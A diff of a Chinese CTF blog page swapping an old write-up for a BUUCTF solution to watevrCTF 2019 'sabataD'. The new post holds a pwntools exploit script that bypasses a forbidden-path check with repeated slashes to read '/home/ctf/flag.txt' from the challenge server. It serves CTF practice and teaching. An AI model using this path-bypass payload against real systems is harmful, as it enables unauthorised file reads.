@@ -3,23 +3,22 @@
 <head>
   <meta charset="utf-8">
   
-  <title>BUU-[FlareOn1]Shellolololol | 欢迎纱布们的到来</title>
+  <title>BUU-[watevrCTF 2019]sabataD | 欢迎纱布们的到来</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="IDA似乎不太好分析。应该有复杂的自解密。用OD打开 ​">
+  <meta name="description" content="主要是构造正确的payload ​">
 <meta property="og:type" content="article">
-<meta property="og:title" content="BUU-[FlareOn1]Shellolololol">
-<meta property="og:url" content="http://example.com/2020/09/29/BUU-FlareOn1-Shellolololol/index.html">
+<meta property="og:title" content="BUU-[watevrCTF 2019]sabataD">
+<meta property="og:url" content="http://example.com/2020/10/22/BUU-watevrCTF-2019-sabataD/index.html">
 <meta property="og:site_name" content="欢迎纱布们的到来">
-<meta property="og:description" content="IDA似乎不太好分析。应该有复杂的自解密。用OD打开 ​">
+<meta property="og:description" content="主要是构造正确的payload ​">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://i.loli.net/2020/09/29/75KnAyqp3NOrt9X.png">
-<meta property="og:image" content="https://i.loli.net/2020/09/29/io8ad72LS9Oj6Rc.jpg">
-<meta property="article:published_time" content="2020-09-29T03:09:24.000Z">
-<meta property="article:modified_time" content="2020-09-29T03:13:36.668Z">
+<meta property="og:image" content="https://i.loli.net/2020/10/22/e5Qbpz8gDTa1MZJ.jpg">
+<meta property="article:published_time" content="2020-10-22T05:39:29.000Z">
+<meta property="article:modified_time" content="2020-10-22T05:48:43.168Z">
 <meta property="article:author" content="Papaya">
 <meta property="article:tag" content="十月姐姐温柔要求每天一道BUU-re">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://i.loli.net/2020/09/29/75KnAyqp3NOrt9X.png">
+<meta name="twitter:image" content="https://i.loli.net/2020/10/22/e5Qbpz8gDTa1MZJ.jpg">
   
     <link rel="alternate" href="/atom.xml" title="欢迎纱布们的到来" type="application/atom+xml">
   
@@ -77,12 +76,12 @@
   </div>
 </div>
 
-        <section id="main"><article id="post-BUU-FlareOn1-Shellolololol" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+        <section id="main"><article id="post-BUU-watevrCTF-2019-sabataD" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2020/09/29/BUU-FlareOn1-Shellolololol/" class="article-date">
-  <time class="post-time" datetime="2020-09-29T03:09:24.000Z" itemprop="datePublished">
-    <span class="post-month">9月</span><br/>
-    <span class="post-day">29</span>
+    <a href="/2020/10/22/BUU-watevrCTF-2019-sabataD/" class="article-date">
+  <time class="post-time" datetime="2020-10-22T05:39:29.000Z" itemprop="datePublished">
+    <span class="post-month">10月</span><br/>
+    <span class="post-day">22</span>
   </time>
 </a>
    
@@ -94,7 +93,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      BUU-[FlareOn1]Shellolololol
+      BUU-[watevrCTF 2019]sabataD
     </h1>
   
 
@@ -109,19 +108,25 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>IDA似乎不太好分析。应该有复杂的自解密。用OD打开</p>
+        <p>主要是构造正确的payload</p>
 <p>​    <a id="more"></a></p>
-<p><img src="https://i.loli.net/2020/09/29/75KnAyqp3NOrt9X.png"></p>
-<p>OD断在了这里。  401000就是关键函数</p>
-<p>走进去是一些操作 并且跳转到栈上运行 我们单步一直跟</p>
-<p>这里把栈的数据用数据窗口显示。我们单步发现里面的数据有变。许多句子显现出来</p>
-<p><img src="https://i.loli.net/2020/09/29/io8ad72LS9Oj6Rc.jpg"></p>
-<p>最后找到了@flare 关键词。找到flag</p>
+<p><img src="https://i.loli.net/2020/10/22/e5Qbpz8gDTa1MZJ.jpg"></p>
+<p>图里解释的很清楚了 这里说一下程序流程</p>
+<p>首先把输入通过函数AEA处理一下，然后按照下标对3对模，分组，组合成新的字符串</p>
+<p>模为0对部分字符串为’Fetch from file with index’</p>
+<p>模为1对部分字符串为’watevr-admin’</p>
+<p>模为2对部分字符串不能为’/home/ctf/flag.txt’</p>
+<p>这里虽然说不能为这个路径，但是flag应该是在这个路径下，这里用多个/绕过</p>
+<p>即字符串可以为 ‘/home/ctf///////flag.txt’</p>
+<p>nptr在输入的151～153位的时候成为下面某个for的循环次数，这里控制为较小的数，比如0 </p>
+<p>满足所有条件后，该程序就会把该路径下的文件printf出来 即为flag</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">work</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">if</span> ord(<span class="string">&#x27;A&#x27;</span>) &lt;= ord(x) <span class="keyword">and</span> ord(x) &lt;= ord(<span class="string">&#x27;Z&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> chr(ord(<span class="string">&#x27;A&#x27;</span>) + ((ord(x) - ord(<span class="string">&#x27;A&#x27;</span>) - <span class="number">13</span>) % <span class="number">26</span>))</span><br><span class="line">    <span class="keyword">if</span> ord(<span class="string">&#x27;a&#x27;</span>) &lt;= ord(x) <span class="keyword">and</span> ord(x) &lt;= ord(<span class="string">&#x27;z&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> chr(ord(<span class="string">&#x27;a&#x27;</span>) + ((ord(x) - ord(<span class="string">&#x27;a&#x27;</span>) - <span class="number">13</span>) % <span class="number">26</span>))</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&#x27;./service&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">25002</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">s0 = <span class="string">&#x27;Fetch from file with index&#x27;</span></span><br><span class="line">s1 = <span class="string">&#x27;watevr-admin&#x27;</span></span><br><span class="line">s2 = <span class="string">&#x27;/home/ctf///////flag.txt&#x27;</span></span><br><span class="line">s0 = s0.ljust(<span class="number">30</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">s1 = s1.ljust(<span class="number">30</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">s2 = s2.ljust(<span class="number">30</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">    payload += work(s0[i])</span><br><span class="line">    payload += work(s1[i])</span><br><span class="line">    payload += work(s2[i])</span><br><span class="line">payload = payload.ljust(<span class="number">150</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += <span class="string">&#x27;000&#x27;</span></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2020/09/29/BUU-FlareOn1-Shellolololol/" data-id="ckgkenvy00003qd9k6rf14u0g" class="article-share-link">分享</a>
+      <a data-url="http://example.com/2020/10/22/BUU-watevrCTF-2019-sabataD/" data-id="ckgkenvy9000hqd9khzw43d6h" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%8D%81%E6%9C%88%E5%A7%90%E5%A7%90%E6%B8%A9%E6%9F%94%E8%A6%81%E6%B1%82%E6%AF%8F%E5%A4%A9%E4%B8%80%E9%81%93BUU-re/" rel="tag">十月姐姐温柔要求每天一道BUU-re</a></li></ul>
@@ -132,19 +137,10 @@
     
 <nav id="article-nav">
   
-    <a href="/2020/09/30/BUU-CFI-CTF-2018-powerPacked/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">上一篇</strong>
-      <div class="article-nav-title">
-        
-          BUU-[CFI-CTF 2018]powerPacked
-        
-      </div>
-    </a>
   
-  
-    <a href="/2020/09/28/BUU-Tricky-Part1/" id="article-nav-older" class="article-nav-link-wrap">
+    <a href="/2020/10/21/BUU-FlareOn2-sender/" id="article-nav-older" class="article-nav-link-wrap">
       <strong class="article-nav-caption">下一篇</strong>
-      <div class="article-nav-title">BUU-Tricky-Part1</div>
+      <div class="article-nav-title">BUU-[FlareOn2]sender</div>
     </a>
   
 </nav>
